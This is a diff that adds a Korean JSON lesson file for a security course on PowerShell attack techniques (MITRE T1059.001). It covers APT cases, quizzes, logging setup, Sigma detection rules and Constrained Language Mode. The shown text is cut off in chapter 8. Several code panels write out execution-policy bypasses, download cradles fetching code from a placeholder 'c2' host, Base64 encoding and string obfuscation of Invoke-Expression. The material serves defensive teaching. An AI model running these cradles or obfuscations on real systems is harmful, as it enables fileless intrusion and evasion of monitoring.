@@ -1,0 +1,1205 @@
+{
+  "techniqueId": "T1059.001",
+  "techniqueName": "Command and Scripting Interpreter: PowerShell",
+  "tacticIds": ["t2"],
+  "tacticName": "Execution",
+  "levels": {
+    "beginner": {
+      "title": "PowerShell 공격 기법 기초",
+      "titleEn": "PowerShell Attack Techniques Basics",
+      "estimatedMinutes": 20,
+      "overviewPanel": {
+        "emoji": "⚡",
+        "question": "시스템 관리 도구가 해커의 무기가 된다면?",
+        "explanation": "PowerShell은 Windows 시스템 관리를 위한 강력한 스크립팅 도구입니다. 하지만 이 강력함이 바로 공격자에게도 매력적인 이유가 됩니다. 파일을 디스크에 남기지 않고 메모리에서 직접 실행하고, 시스템의 거의 모든 기능에 접근할 수 있으며, Windows에 기본 설치되어 있어 추가 도구 없이 공격이 가능합니다. 마치 스위스 군용 칼이 캠핑에도, 범죄에도 사용될 수 있는 것과 같습니다.",
+        "learningGoals": [
+          { "emoji": "🧠", "title": "PowerShell 기본 이해", "desc": "PowerShell이 무엇이며 왜 공격자가 선호하는지 학습합니다" },
+          { "emoji": "⚔️", "title": "공격 활용 원리 파악", "desc": "공격자가 PowerShell을 어떤 방식으로 악용하는지 알아봅니다" },
+          { "emoji": "🛡️", "title": "기본 방어 개념", "desc": "실행 정책, 로깅 등 핵심 방어 메커니즘의 개념을 이해합니다" }
+        ],
+        "nextLevelTeaser": "중급 과정에서 실행 정책 우회, 인코딩 난독화, Fileless 실행 기법과 Sigma 탐지 규칙을 분석합니다"
+      },
+      "chapters": [
+        {
+          "id": "ch1",
+          "title": "PowerShell이란?",
+          "panels": [
+            {
+              "type": "analogy",
+              "heading": "스위스 군용 칼: 만능 시스템 도구",
+              "emojis": "🔧🗡️",
+              "content": "스위스 군용 칼에는 칼날, 가위, 드라이버 등 다양한 도구가 들어 있습니다. PowerShell도 마찬가지입니다. 파일 관리, 네트워크 설정, 레지스트리 편집, 원격 시스템 관리까지 하나의 도구로 모든 것을 할 수 있습니다. 시스템 관리자에게는 필수 도구이지만, 공격자에게도 동일한 능력이 무기가 됩니다. 추가 도구를 설치할 필요 없이 Windows에 이미 내장되어 있다는 점이 핵심입니다."
+            },
+            {
+              "type": "concept",
+              "heading": "PowerShell의 핵심 특징",
+              "emojis": "⚙️",
+              "content": "PowerShell은 Microsoft가 개발한 명령줄 셸이자 스크립팅 언어입니다. 주요 특징: ① .NET Framework 기반 — C#의 거의 모든 기능을 스크립트로 사용 가능. ② 객체 기반 파이프라인 — 텍스트가 아닌 .NET 객체를 전달. ③ Cmdlet 시스템 — Get-Process, Invoke-WebRequest 등 동사-명사 형태의 명령어. ④ 원격 실행 — WinRM을 통해 원격 시스템에서 명령 실행 가능. ⑤ Windows 기본 설치 — 별도 설치 없이 즉시 사용 가능."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "PowerShell vs 기존 명령 프롬프트(CMD)",
+              "headers": ["항목", "CMD (명령 프롬프트)", "PowerShell"],
+              "rows": [
+                ["기반 기술", "DOS 명령어", ".NET Framework"],
+                ["데이터 처리", "텍스트 기반", "객체 기반"],
+                ["스크립팅 능력", "제한적 (.bat)", "완전한 프로그래밍 언어"],
+                ["원격 실행", "제한적", "WinRM 기반 완전 지원"],
+                [".NET 접근", "불가", "직접 호출 가능"],
+                ["공격 위험도", "🟡 중간", "🔴 매우 높음"]
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch2",
+          "title": "PowerShell이 공격에 활용되는 이유",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "공격자가 PowerShell을 선호하는 5가지 이유",
+              "emojis": "🎯",
+              "content": "① Living-off-the-Land — Windows에 기본 설치되어 추가 악성코드 없이 공격 가능. ② Fileless 실행 — 디스크에 파일을 남기지 않고 메모리에서 직접 코드 실행. ③ 난독화 용이 — Base64 인코딩, 문자열 조합 등으로 탐지 우회. ④ .NET 접근 — System.Net.WebClient로 파일 다운로드, System.Reflection으로 메모리 로딩. ⑤ 원격 실행 — Invoke-Command로 네트워크 내 다른 시스템에서 명령 실행."
+            },
+            {
+              "type": "diagram",
+              "heading": "PowerShell 기반 공격 흐름",
+              "ascii": "  [피싱 이메일]          [대상 시스템]\n       │                      │\n       ├── 악성 매크로 ──→    │  powershell.exe 실행\n       │                      │       │\n       │                      │       ▼\n       │                 [메모리에서 스크립트 실행]\n       │                      │       │\n       │                      │  ┌────┴────┐\n       │                      │  │ 추가     │\n       │                      │  │ 페이로드 │\n       │                      │  │ 다운로드 │\n       │                      │  └────┬────┘\n       │                      │       │\n       │                      │       ▼\n       │                 [C2 서버 연결 (Reverse Shell)]\n       │                      │       │\n       │                      │       ▼\n       │                 [내부 정찰 → 횡단이동 → 목표 달성]"
+            }
+          ]
+        },
+        {
+          "id": "ch3",
+          "title": "주요 공격 명령어 개요",
+          "panels": [
+            {
+              "type": "comparison_table",
+              "heading": "공격에 자주 사용되는 PowerShell Cmdlet",
+              "headers": ["Cmdlet / 기법", "용도", "위험도"],
+              "rows": [
+                ["Invoke-Expression (IEX)", "문자열을 코드로 실행 — 다운로드 크레이들의 핵심", "🔴 매우 높음"],
+                ["Invoke-WebRequest / Net.WebClient", "원격 서버에서 파일 또는 스크립트 다운로드", "🔴 높음"],
+                ["Invoke-Command", "WinRM을 통한 원격 시스템 명령 실행", "🔴 높음"],
+                ["-EncodedCommand", "Base64 인코딩된 명령 실행 (로그 분석 어려움)", "🔴 높음"],
+                ["Start-Process", "새 프로세스 생성 (악성코드 실행)", "🟡 중간"],
+                ["Add-Type", "C# 코드를 동적 컴파일하여 .NET 어셈블리 생성", "🔴 높음"],
+                ["[System.Reflection.Assembly]::Load", "메모리에서 직접 .NET 어셈블리 로딩", "🔴 매우 높음"]
+              ]
+            },
+            {
+              "type": "warning",
+              "heading": "교육 목적 안내",
+              "content": "이 강의에서 소개하는 명령어와 기법은 보안 전문가가 방어 전략을 수립하기 위해 '공격 원리를 이해하는 것'이 목적입니다. 허가 없이 타인의 시스템에 이러한 기법을 사용하면 정보통신망법, 형법 등에 의해 법적 처벌을 받을 수 있습니다."
+            }
+          ]
+        },
+        {
+          "id": "ch4",
+          "title": "실제 APT 공격 사례",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "APT29 (Cozy Bear) — SolarWinds & PowerShell",
+              "emojis": "🐻",
+              "content": "러시아 정부와 연계된 APT29는 다수의 침투 작전에서 PowerShell을 핵심 도구로 사용했습니다. SolarWinds 공급망 공격 이후 내부 네트워크에서 PowerShell을 이용해 추가 페이로드를 다운로드하고, Invoke-Command로 원격 시스템에 명령을 전파했습니다. 특히 -EncodedCommand 옵션으로 명령을 Base64 인코딩하여 로그 분석을 어렵게 만들었습니다."
+            },
+            {
+              "type": "concept",
+              "heading": "FIN7 — Carbanak/PowerShell 기반 금융 공격",
+              "emojis": "💳",
+              "content": "금융 범죄 그룹 FIN7은 PowerShell 기반 공격의 대표적 사례입니다. 피싱 이메일의 악성 Word 매크로가 PowerShell을 호출하여 Carbanak 백도어를 메모리에 직접 로딩했습니다. 디스크에 파일을 남기지 않는 Fileless 기법으로 기존 안티바이러스를 우회하며, 수백 개의 금융기관에서 수십억 달러를 탈취했습니다."
+            },
+            {
+              "type": "concept",
+              "heading": "Lazarus Group — PowerShell 다운로드 크레이들",
+              "emojis": "🇰🇵",
+              "content": "북한 연계 Lazarus Group은 초기 침투 후 PowerShell 다운로드 크레이들을 활용하여 추가 공격 도구를 배포합니다. IEX(New-Object Net.WebClient).DownloadString() 패턴으로 C2 서버에서 스크립트를 메모리에 직접 실행하며, 한국 금융기관과 암호화폐 거래소를 주요 대상으로 삼고 있습니다."
+            },
+            {
+              "type": "info",
+              "heading": "한국 사례: 국내 APT 공격에서의 PowerShell",
+              "content": "KISA 침해사고 분석 보고서에 따르면, 국내 기관 대상 APT 공격의 상당수에서 PowerShell이 초기 실행 단계에 사용되었습니다. 특히 한글(HWP) 문서의 PostScript 취약점을 통해 PowerShell을 호출하는 패턴이 다수 발견되었으며, 이는 한국 특화된 공격 벡터입니다."
+            }
+          ]
+        }
+      ],
+      "miniLabs": [
+        {
+          "type": "matching_game",
+          "title": "PowerShell Cmdlet 용도 매칭",
+          "description": "각 PowerShell 명령어가 공격에서 어떤 용도로 사용되는지 매칭하세요.",
+          "pairs": [
+            { "left": "문자열을 코드로 변환하여 실행하는 명령", "right": "Invoke-Expression (IEX)" },
+            { "left": "원격 서버에서 파일이나 스크립트를 다운로드", "right": "Invoke-WebRequest" },
+            { "left": "WinRM을 통해 원격 시스템에서 명령을 실행", "right": "Invoke-Command" },
+            { "left": "Base64로 인코딩된 명령을 디코딩하여 실행", "right": "-EncodedCommand" },
+            { "left": "C# 코드를 동적으로 컴파일하여 실행", "right": "Add-Type" }
+          ]
+        }
+      ],
+      "quiz": {
+        "questions": [
+          {
+            "question": "공격자가 PowerShell을 선호하는 가장 핵심적인 이유는?",
+            "options": [
+              "실행 속도가 매우 빠르기 때문",
+              "Windows에 기본 설치되어 추가 도구 없이 공격 가능 (Living-off-the-Land)",
+              "Linux에서도 실행 가능하기 때문",
+              "GUI 인터페이스가 편리하기 때문"
+            ],
+            "correct": 1,
+            "explanation": "PowerShell은 Windows에 기본 설치되어 있어 공격자가 별도의 악성 도구를 설치할 필요가 없습니다. 이를 Living-off-the-Land(LotL) 기법이라 하며, 합법적 시스템 도구를 악용하므로 탐지가 어렵습니다."
+          },
+          {
+            "question": "PowerShell의 Fileless 실행이 위험한 이유는?",
+            "options": [
+              "디스크에 파일을 남기지 않아 기존 파일 기반 안티바이러스를 우회할 수 있음",
+              "실행 속도가 빠르기 때문",
+              "관리자 권한이 필요 없기 때문",
+              "네트워크 트래픽이 발생하지 않기 때문"
+            ],
+            "correct": 0,
+            "explanation": "Fileless 실행은 코드가 메모리에서만 동작하고 디스크에 파일을 저장하지 않습니다. 전통적인 안티바이러스는 디스크의 파일을 스캔하므로, 메모리에서만 존재하는 악성 코드를 탐지하기 어렵습니다."
+          },
+          {
+            "question": "다음 중 PowerShell 다운로드 크레이들(Download Cradle)에 해당하는 것은?",
+            "options": [
+              "Get-Process | Stop-Process",
+              "IEX(New-Object Net.WebClient).DownloadString('http://...')",
+              "Set-ExecutionPolicy Restricted",
+              "Get-EventLog -LogName Security"
+            ],
+            "correct": 1,
+            "explanation": "다운로드 크레이들은 원격 서버에서 스크립트를 다운로드하여 즉시 메모리에서 실행하는 패턴입니다. Net.WebClient로 코드를 다운로드하고 IEX(Invoke-Expression)로 실행하면 디스크에 파일을 남기지 않습니다."
+          },
+          {
+            "question": "FIN7 그룹이 PowerShell을 활용한 주요 공격 방식은?",
+            "options": [
+              "SQL 인젝션을 통한 데이터베이스 공격",
+              "피싱 이메일의 악성 매크로 → PowerShell로 Fileless 백도어 로딩",
+              "DDoS 공격으로 서비스 마비",
+              "물리적 USB 드라이브를 이용한 감염"
+            ],
+            "correct": 1,
+            "explanation": "FIN7은 피싱 이메일에 첨부된 악성 Word 문서의 매크로가 PowerShell을 호출하고, Carbanak 백도어를 메모리에 직접 로딩하는 Fileless 기법을 사용했습니다. 이 방식으로 수백 개의 금융기관을 공격했습니다."
+          },
+          {
+            "question": "PowerShell의 -EncodedCommand 옵션이 공격자에게 유용한 이유는?",
+            "options": [
+              "명령을 암호화하여 해독이 불가능하기 때문",
+              "Base64 인코딩으로 명령의 원문을 숨겨 로그 분석을 어렵게 만들기 때문",
+              "실행 속도를 향상시키기 때문",
+              "관리자 권한을 우회할 수 있기 때문"
+            ],
+            "correct": 1,
+            "explanation": "-EncodedCommand는 Base64로 인코딩된 명령을 실행합니다. 이는 암호화가 아니라 인코딩이므로 쉽게 디코딩할 수 있지만, 로그에 Base64 문자열만 남아 즉각적인 분석이 어렵고 특수 문자 처리도 용이합니다."
+          }
+        ]
+      }
+    },
+    "intermediate": {
+      "title": "PowerShell 공격 기법과 탐지",
+      "titleEn": "PowerShell Attack Techniques & Detection",
+      "estimatedMinutes": 30,
+      "overviewPanel": {
+        "emoji": "🔬",
+        "question": "PowerShell 난독화 코드를 해독하고 탐지 규칙을 작성할 수 있나요?",
+        "explanation": "이 중급 과정에서는 실행 정책 우회, Base64 인코딩, Fileless 실행 기법을 코드 수준에서 분석합니다. 또한 Script Block Logging, Sigma 규칙, Event Log 분석을 통해 악성 PowerShell 활동을 탐지하는 방법을 학습합니다.",
+        "learningGoals": [
+          { "emoji": "💻", "title": "우회 기법 코드 분석", "desc": "실행 정책 우회, 인코딩 난독화, AMSI 우회의 코드 로직을 이해합니다" },
+          { "emoji": "📝", "title": "탐지 규칙 작성", "desc": "Sigma 규칙과 PowerShell 로깅 설정으로 악성 활동을 탐지합니다" },
+          { "emoji": "🔄", "title": "방어 전략 수립", "desc": "Constrained Language Mode, 로깅 강화 등 실질적 방어 방법을 학습합니다" }
+        ],
+        "nextLevelTeaser": "고급 과정에서 AMSI 내부 구조, .NET 리플렉션 로딩, YARA 규칙 기반 탐지를 심층 분석합니다"
+      },
+      "chapters": [
+        {
+          "id": "ch1",
+          "title": "PowerShell 실행 정책 우회 기법",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "실행 정책(Execution Policy)이란?",
+              "emojis": "🚧",
+              "content": "PowerShell 실행 정책은 스크립트 실행을 제어하는 설정입니다. Restricted(기본값, 스크립트 실행 차단), AllSigned(서명된 스크립트만), RemoteSigned(원격 다운로드 스크립트는 서명 필요), Unrestricted(모두 허용), Bypass(제한 없음). 하지만 Microsoft 공식 문서에서도 명시하듯이, 이것은 '보안 기능이 아닌 사용자 편의 설정'입니다."
+            },
+            {
+              "type": "code",
+              "heading": "실행 정책 우회 기법들",
+              "filename": "bypass_execution_policy.ps1",
+              "language": "powershell",
+              "warning": "교육 목적 명령어 — 허가된 환경에서만 실행",
+              "lines": [
+                { "text": "# 방법 1: -ExecutionPolicy Bypass 플래그", "color": "slate" },
+                { "text": "powershell.exe -ExecutionPolicy Bypass -File script.ps1", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "# 방법 2: 파이프라인을 통한 우회", "color": "slate" },
+                { "text": "Get-Content script.ps1 | powershell.exe -NoProfile -", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "# 방법 3: 원격 다운로드 + 즉시 실행", "color": "slate" },
+                { "text": "powershell.exe -Nop -Exec Bypass -C \"IEX(IWR 'http://c2/payload')\"", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# 방법 4: 현재 세션에서만 정책 변경", "color": "slate" },
+                { "text": "Set-ExecutionPolicy Bypass -Scope Process", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 방법 5: 레지스트리를 통한 우회", "color": "slate" },
+                { "text": "Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell' -Name 'ExecutionPolicy' -Value 'Bypass'", "color": "orange" }
+              ]
+            },
+            {
+              "type": "warning",
+              "heading": "실행 정책은 보안 경계가 아님",
+              "content": "Microsoft 공식 문서에 따르면 실행 정책은 '보안 기능이 아니라 사용자 편의 기능'입니다. 최소 15가지 이상의 우회 방법이 알려져 있으며, 공격자는 이를 쉽게 우회합니다. 따라서 실행 정책에 의존하지 않고, 로깅과 AMSI 등 다른 방어 계층을 함께 사용해야 합니다."
+            }
+          ]
+        },
+        {
+          "id": "ch2",
+          "title": "인코딩 및 난독화 기법",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Base64 인코딩과 -EncodedCommand",
+              "emojis": "🔤",
+              "content": "공격자는 PowerShell 명령을 Base64로 인코딩하여 로그 분석을 어렵게 만듭니다. -EncodedCommand(-enc) 옵션은 Base64 인코딩된 유니코드(UTF-16LE) 문자열을 디코딩하여 실행합니다. 이는 암호화가 아니므로 디코딩은 쉽지만, 즉각적인 로그 분석을 방해합니다."
+            },
+            {
+              "type": "code",
+              "heading": "Base64 인코딩 공격 명령",
+              "filename": "encoded_command.ps1",
+              "language": "powershell",
+              "warning": "인코딩 분석 예시 — 교육 목적",
+              "lines": [
+                { "text": "# 원본 명령 (다운로드 크레이들)", "color": "slate" },
+                { "text": "$cmd = 'IEX(New-Object Net.WebClient).DownloadString(\"http://c2/payload\")'", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# Base64 인코딩 (UTF-16LE)", "color": "slate" },
+                { "text": "$bytes = [Text.Encoding]::Unicode.GetBytes($cmd)", "color": "cyan" },
+                { "text": "$encoded = [Convert]::ToBase64String($bytes)", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "# 인코딩된 명령으로 실행", "color": "slate" },
+                { "text": "powershell.exe -EncodedCommand $encoded", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 디코딩 (방어자 분석용)", "color": "green" },
+                { "text": "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))", "color": "green" }
+              ]
+            },
+            {
+              "type": "code",
+              "heading": "문자열 난독화 기법들",
+              "filename": "obfuscation_techniques.ps1",
+              "language": "powershell",
+              "warning": "난독화 분석 예시 — 교육 목적",
+              "lines": [
+                { "text": "# 기법 1: 문자열 연결 (Concatenation)", "color": "slate" },
+                { "text": "$a='Inv';$b='oke-';$c='Exp';$d='ression'; &($a+$b+$c+$d) 'whoami'", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 기법 2: 역따옴표 삽입 (Backtick)", "color": "slate" },
+                { "text": "In`vo`ke-Ex`pre`ssion 'Get-Process'", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 기법 3: 환경 변수 조합", "color": "slate" },
+                { "text": "$env:ComSpec[4,15,25]-join'' | & $_ 'whoami'", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 기법 4: -Replace를 이용한 조합", "color": "slate" },
+                { "text": "('I]nv]oke]-]Exp]ression' -Replace ']','') 'whoami'", "color": "orange" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch3",
+          "title": "Fileless 실행 기법",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "다운로드 크레이들(Download Cradle)",
+              "emojis": "🕸️",
+              "content": "다운로드 크레이들은 원격 서버에서 코드를 다운로드하여 메모리에서 즉시 실행하는 패턴입니다. 디스크에 파일을 저장하지 않으므로 Fileless 공격의 핵심입니다. 대표적 패턴: Net.WebClient.DownloadString(), Invoke-WebRequest, System.Net.Http.HttpClient, XML/COM 객체 활용 등 다양한 변종이 존재합니다."
+            },
+            {
+              "type": "code",
+              "heading": "주요 다운로드 크레이들 패턴",
+              "filename": "download_cradles.ps1",
+              "language": "powershell",
+              "warning": "Fileless 공격 패턴 분석 — 교육 목적",
+              "lines": [
+                { "text": "# 패턴 1: Net.WebClient (가장 흔함)", "color": "slate" },
+                { "text": "IEX(New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# 패턴 2: Invoke-WebRequest (PS 3.0+)", "color": "slate" },
+                { "text": "IEX(Invoke-WebRequest -Uri 'http://c2/payload.ps1' -UseBasicParsing).Content", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# 패턴 3: Invoke-RestMethod", "color": "slate" },
+                { "text": "IEX(Invoke-RestMethod 'http://c2/payload.ps1')", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# 패턴 4: .NET HttpClient", "color": "slate" },
+                { "text": "$c=[Net.Http.HttpClient]::new();IEX($c.GetStringAsync('http://c2/p').Result)", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 패턴 5: XML DOM (COM 객체 활용)", "color": "slate" },
+                { "text": "$x=New-Object -COM Msxml2.XMLHTTP;$x.Open('GET','http://c2/p',$false);$x.Send();IEX $x.responseText", "color": "orange" }
+              ]
+            },
+            {
+              "type": "concept",
+              "heading": "리플렉션 로딩 (Reflection Loading) 개요",
+              "emojis": "🪞",
+              "content": ".NET 리플렉션을 이용하면 컴파일된 DLL이나 EXE를 디스크에 저장하지 않고 메모리에서 직접 로딩할 수 있습니다. 공격자는 이 기법으로 C#으로 작성된 공격 도구(Rubeus, Seatbelt 등)를 PowerShell에서 Fileless로 실행합니다. System.Reflection.Assembly::Load()가 핵심 API입니다."
+            }
+          ]
+        },
+        {
+          "id": "ch4",
+          "title": "PowerShell 로깅 메커니즘",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "PowerShell 보안 로깅 3대 요소",
+              "emojis": "📋",
+              "content": "PowerShell은 3가지 핵심 로깅 메커니즘을 제공합니다: ① Script Block Logging (Event ID 4104) — 실행되는 모든 스크립트 블록을 기록. 난독화를 해제한 원본 코드도 캡처. ② Module Logging (Event ID 4103) — 모듈별 실행 로그. 입력/출력 파이프라인 기록. ③ Transcription — 콘솔의 모든 입출력을 텍스트 파일로 저장. 세 가지를 모두 활성화해야 효과적인 모니터링이 가능합니다."
+            },
+            {
+              "type": "code",
+              "heading": "PowerShell 로깅 활성화 (GPO 설정)",
+              "filename": "enable_ps_logging.ps1",
+              "language": "powershell",
+              "warning": "방어 설정 스크립트 — 실제 환경 적용 전 테스트 필수",
+              "lines": [
+                { "text": "# Script Block Logging 활성화", "color": "green" },
+                { "text": "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' `", "color": "cyan" },
+                { "text": "    -Name 'EnableScriptBlockLogging' -Value 1 -PropertyType DWord -Force", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "# Module Logging 활성화 (모든 모듈)", "color": "green" },
+                { "text": "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging' `", "color": "cyan" },
+                { "text": "    -Name 'EnableModuleLogging' -Value 1 -PropertyType DWord -Force", "color": "cyan" },
+                { "text": "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames' `", "color": "cyan" },
+                { "text": "    -Name '*' -Value '*' -PropertyType String -Force", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# Transcription 활성화", "color": "green" },
+                { "text": "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' `", "color": "cyan" },
+                { "text": "    -Name 'EnableTranscripting' -Value 1 -PropertyType DWord -Force", "color": "cyan" },
+                { "text": "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription' `", "color": "cyan" },
+                { "text": "    -Name 'OutputDirectory' -Value 'C:\\PSLogs' -PropertyType String -Force", "color": "orange" }
+              ]
+            },
+            {
+              "type": "comparison_table",
+              "heading": "PowerShell 로그 유형별 비교",
+              "headers": ["로그 유형", "Event ID", "기록 내용", "난독화 해제"],
+              "rows": [
+                ["Script Block Logging", "4104", "실행된 스크립트 블록 전문", "✅ 자동 해제"],
+                ["Module Logging", "4103", "모듈 명령어 및 파이프라인", "❌ 없음"],
+                ["Transcription", "파일", "콘솔 입출력 전체", "❌ 없음"],
+                ["Process Creation", "4688", "프로세스 생성 명령줄", "❌ 없음"]
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch5",
+          "title": "Sigma 탐지 규칙 분석",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "PowerShell 악용 탐지 Sigma 규칙",
+              "emojis": "📡",
+              "content": "Sigma는 SIEM에 독립적인 탐지 규칙 형식입니다. PowerShell 악용 탐지에 자주 사용되는 Sigma 규칙은 -EncodedCommand 사용, 다운로드 크레이들 패턴, 실행 정책 우회 등을 감지합니다. 규칙을 Splunk, Elasticsearch, Microsoft Sentinel 등으로 변환하여 어떤 SIEM 환경에서든 활용할 수 있습니다."
+            },
+            {
+              "type": "code",
+              "heading": "인코딩된 PowerShell 명령 탐지 Sigma 규칙",
+              "filename": "sigma_encoded_ps.yml",
+              "language": "yaml",
+              "lines": [
+                { "text": "title: Suspicious Encoded PowerShell Command", "color": "green" },
+                { "text": "id: f3a21c5a-8a2b-4e09-b7c1-d5e8a9f3c2b1", "color": "slate" },
+                { "text": "status: production", "color": "cyan" },
+                { "text": "level: high", "color": "red" },
+                { "text": "description: >", "color": "green" },
+                { "text": "  Detects PowerShell execution with encoded commands", "color": "green" },
+                { "text": "  commonly used for obfuscation in attacks", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "logsource:", "color": "yellow" },
+                { "text": "  category: process_creation", "color": "cyan" },
+                { "text": "  product: windows", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "detection:", "color": "yellow" },
+                { "text": "  selection_process:", "color": "orange" },
+                { "text": "    Image|endswith:", "color": "cyan" },
+                { "text": "      - '\\powershell.exe'", "color": "purple" },
+                { "text": "      - '\\pwsh.exe'", "color": "purple" },
+                { "text": "  selection_encoded:", "color": "orange" },
+                { "text": "    CommandLine|contains:", "color": "cyan" },
+                { "text": "      - '-enc'", "color": "purple" },
+                { "text": "      - '-EncodedCommand'", "color": "purple" },
+                { "text": "      - '-ec '", "color": "purple" },
+                { "text": "  condition: selection_process and selection_encoded", "color": "yellow" }
+              ]
+            },
+            {
+              "type": "code",
+              "heading": "다운로드 크레이들 탐지 Sigma 규칙",
+              "filename": "sigma_download_cradle.yml",
+              "language": "yaml",
+              "lines": [
+                { "text": "title: PowerShell Download Cradle Detection", "color": "green" },
+                { "text": "id: b8e2c7d1-9f3a-4c5e-a6d8-1e2f3b4c5d6e", "color": "slate" },
+                { "text": "status: production", "color": "cyan" },
+                { "text": "level: high", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "logsource:", "color": "yellow" },
+                { "text": "  product: windows", "color": "cyan" },
+                { "text": "  category: ps_script", "color": "cyan" },
+                { "text": "  definition: Script Block Logging must be enabled", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "detection:", "color": "yellow" },
+                { "text": "  selection_download:", "color": "orange" },
+                { "text": "    ScriptBlockText|contains:", "color": "cyan" },
+                { "text": "      - 'Net.WebClient'", "color": "purple" },
+                { "text": "      - 'DownloadString'", "color": "purple" },
+                { "text": "      - 'DownloadFile'", "color": "purple" },
+                { "text": "      - 'Invoke-WebRequest'", "color": "purple" },
+                { "text": "      - 'Invoke-RestMethod'", "color": "purple" },
+                { "text": "  selection_execute:", "color": "orange" },
+                { "text": "    ScriptBlockText|contains:", "color": "cyan" },
+                { "text": "      - 'IEX'", "color": "purple" },
+                { "text": "      - 'Invoke-Expression'", "color": "purple" },
+                { "text": "  condition: selection_download and selection_execute", "color": "yellow" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch6",
+          "title": "Event Log 분석",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "핵심 이벤트 로그 분석 포인트",
+              "emojis": "🔍",
+              "content": "PowerShell 공격 탐지의 핵심 이벤트 ID: ① Event ID 4104 (Script Block Logging) — 실행된 PowerShell 코드 전문. 난독화가 자동 해제되어 원본 코드를 확인 가능. ② Event ID 4103 (Module Logging) — Cmdlet 실행과 파이프라인 데이터. ③ Event ID 4688 (Process Creation) — powershell.exe 프로세스 생성 및 명령줄 인자. 명령줄에 -enc, -nop, -w hidden 등 의심 플래그 확인."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "Event ID별 탐지 포인트",
+              "headers": ["Event ID", "로그 소스", "탐지 대상", "핵심 필드"],
+              "rows": [
+                ["4104", "PowerShell/Operational", "스크립트 블록 실행", "ScriptBlockText"],
+                ["4103", "PowerShell/Operational", "모듈/Cmdlet 실행", "Payload, ContextInfo"],
+                ["4688", "Security", "프로세스 생성", "NewProcessName, CommandLine"],
+                ["800", "PowerShell/Operational", "파이프라인 실행 상세", "HostApplication"],
+                ["7045", "System", "서비스 설치 (지속성)", "ImagePath"]
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch7",
+          "title": "방어 전략: Constrained Language Mode",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Constrained Language Mode(CLM)란?",
+              "emojis": "🔒",
+              "content": "Constrained Language Mode는 PowerShell의 언어 기능을 제한하는 보안 모드입니다. CLM에서는: ① Add-Type으로 C# 코드 컴파일 불가. ② .NET 리플렉션 사용 불가. ③ COM 객체 생성 제한. ④ 허용된 타입만 사용 가능. AppLocker 또는 WDAC 정책과 연동하여 자동으로 CLM이 적용됩니다. Fileless 공격의 핵심인 리플렉션 로딩과 동적 코드 실행을 효과적으로 차단합니다."
+            },
+            {
+              "type": "code",
+              "heading": "CLM 상태 확인 및 AppLocker 연동",
+              "filename": "clm_setup.ps1",
+              "language": "powershell",
+              "warning": "방어 설정 — 운영 환경 적용 전 테스트 필수",
+              "lines": [
+                { "text": "# 현재 Language Mode 확인", "color": "green" },
+                { "text": "$ExecutionContext.SessionState.LanguageMode", "color": "cyan" },
+                { "text": "# 출력: FullLanguage (기본) 또는 ConstrainedLanguage", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "# CLM에서 차단되는 동작 예시", "color": "green" },
+                { "text": "# 다음은 CLM에서 모두 오류 발생:", "color": "slate" },
+                { "text": "Add-Type -TypeDefinition 'public class Test{}'  # 차단!", "color": "red" },
+                { "text": "[System.Reflection.Assembly]::Load($bytes)      # 차단!", "color": "red" },
+                { "text": "New-Object -COM WScript.Shell                    # 차단!", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "# AppLocker로 CLM 자동 적용 (GPO 설정)", "color": "green" },
+                { "text": "# 1. AppLocker DLL 규칙 활성화", "color": "slate" },
+                { "text": "# 2. 허용된 스크립트 경로만 FullLanguage", "color": "slate" },
+                { "text": "# 3. 나머지는 자동으로 ConstrainedLanguage 적용", "color": "slate" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch8",
+          "title": "실전 탐지 파이프라인 구축",
+          "panels": [
+            {
